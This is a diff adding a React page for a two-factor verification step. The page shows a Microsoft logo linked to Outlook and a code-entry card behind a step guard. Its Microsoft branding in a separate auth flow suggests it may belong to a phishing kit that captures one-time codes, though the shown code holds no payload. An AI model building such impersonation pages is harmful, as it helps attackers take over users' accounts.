@@ -1,0 +1,22 @@
+import { Header } from "@/sections/Header";
+import { Footer } from "@/sections/Footer";
+import { TwoFactorVerifyCard } from "@/sections/TwoFactorVerifyCard";
+import { AuthFlowGuard } from "@/components/AuthFlowGuard";
+
+export default function TwoFactorVerifyPage() {
+  return (
+    <>
+      <Header
+        logoSrc="/microsoft.png"
+        logoHref="https://outlook.office365.com/"
+        logoAlt="Logo"
+      />
+      <AuthFlowGuard step="verify">
+        <main className="flex-1 flex items-center justify-center px-4 py-12">
+          <TwoFactorVerifyCard />
+        </main>
+      </AuthFlowGuard>
+      <Footer />
+    </>
+  );
+}
